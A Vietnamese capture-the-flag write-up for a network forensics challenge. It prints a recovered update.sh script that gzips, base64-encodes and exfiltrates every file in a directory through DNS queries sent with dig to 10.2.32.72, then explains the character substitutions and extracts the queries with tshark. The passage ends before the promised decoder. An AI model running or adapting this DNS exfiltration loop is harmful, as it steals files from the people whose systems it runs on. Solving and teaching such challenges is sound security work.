***NetLab2: Protected Vault***

![image](https://github.com/user-attachments/assets/e04bf9e3-3b83-41ba-8b4a-e58bca68697d)

Nhìn trong file khi dung Export Oject ta được ```update.sh``` như sau:

```python
for f in $(ls .); 
do s=4;b=50;c=0; 
for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g");
do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-.";
 c=$(($c+1)); 
 else echo -ne "\n$i-."; 
 c=1;
  fi; 
  done ); 
 do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr "+" "}"|tr "/" "{"` +short; 
 done ; 
 done
```

dịch đoạn code sau ta có vài điểm lưu ý:

```python
 else echo -ne "\n$i-.";
```
Đây là thay thế xuống dòng bằng ```i-```

```python
 do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr "+" "}"|tr "/" "{"` +short;
```

Thay thế ```+``` bằng ```}```, ```/``` bằng ```{```.
Lưu ý 2 điểm này nó sẽ quan trọng trong bài toán sau.
>
Filter dns thấy được 1 luồn file như base64, chúng ta sẽ tách ra hết để decode xem thử.

```python
tshark -nr netlab2.pcap -Y "dns" -T fields -e dns.qry.name > dns.txt
```

Có vẻ này là file đã decode từ đoạn code kia và vì tác giả bài wu đã thử base64 rất nhiều lần :))). Nên giờ sẽ sửa lại như 2 điều ở trên đã nói bằng đoạn python sau.


